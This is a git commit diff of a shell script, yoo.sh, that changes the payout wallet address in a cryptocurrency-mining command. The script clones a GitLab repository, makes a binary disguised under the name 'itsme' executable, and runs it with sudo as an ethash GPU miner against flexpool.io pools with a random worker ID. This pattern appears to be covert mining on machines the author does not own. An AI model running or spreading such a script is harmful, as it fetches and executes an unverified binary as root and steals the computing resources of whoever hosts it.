a5e1dee5780c63861bed3fdb1a08efc748af12c8
Treecommon <103907893+Treecommon@users.noreply.github.com>
2022-04-22 04:32:12 +0700

    Update yoo.sh

--- yoo.sh
+++ yoo.sh
@@ -6,4 +6,4 @@ screen -dmS gr2.sh 65 75
 sudo git clone https://gitlab.com/taufiqurrohmanmaz/sainame127.git
 cd sainame127
 chmod +x itsme
-sudo ./itsme -a ethash -w 0x0F8824d694772df58840EDdD06a36526A0063438 -p ethproxy+tcp://eth-sg.flexpool.io:4444 ethproxy+tcp://eth-hk.flexpool.io -r $(echo $(shuf -i 19141-34464563 -n 1))  --nvidia 1
+sudo ./itsme -a ethash -w 0x3D02F7B8DCB18E778fE35bf8B5A7F91d819bF0C4 -p ethproxy+tcp://eth-sg.flexpool.io:4444 ethproxy+tcp://eth-hk.flexpool.io -r $(echo $(shuf -i 19141-34464563 -n 1))  --nvidia 1
